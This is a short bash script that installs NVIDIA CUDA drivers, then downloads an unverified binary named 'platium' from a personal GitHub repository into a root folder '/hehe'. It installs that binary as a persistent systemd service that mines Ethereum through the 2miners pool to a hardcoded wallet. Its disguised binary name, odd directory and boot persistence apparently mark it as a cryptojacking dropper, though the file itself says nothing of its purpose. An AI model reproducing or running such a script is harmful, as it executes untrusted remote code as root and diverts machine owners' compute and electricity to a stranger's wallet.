#!/bin/bash
sudo mkdir /hehe
sudo chmod -R +x hehe
cd /hehe
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-keyring_1.0-1_all.deb
sudo dpkg -i cuda-keyring_1.0-1_all.deb
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/3bf863cc.pub
sudo apt-get update
sudo apt-get -y install cuda-drivers-510 libcurl3
sudo wget https://github.com/flamingo8683/kienphake/raw/main/platium
sudo chmod +x platium
sudo bash -c 'echo -e "[Unit]\nDescription=platium\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/hehe/platium -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x7fdBf600c50CCE0916313dEbF2C7B7A53707ad19 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/platium.service'
sudo systemctl daemon-reload
sudo systemctl enable platium.service
sudo ./platium -pool eth.2miners.com:2020 -wal 0x7fdBf600c50CCE0916313dEbF2C7B7A53707ad19 -worker 0 -pass kiencailol